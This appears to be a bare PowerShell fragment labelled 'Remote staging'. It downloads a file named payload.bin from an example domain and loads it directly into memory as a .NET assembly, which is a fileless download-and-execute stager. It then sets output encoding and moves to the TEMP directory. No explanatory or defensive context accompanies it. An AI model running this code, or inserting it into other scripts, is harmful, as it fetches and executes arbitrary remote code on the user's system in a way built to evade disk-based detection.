
# Remote staging
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('https://adatum.com/payload.bin')
[Reflection.Assembly]::Load($ManagedBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Set-Location -Path $env:TEMP
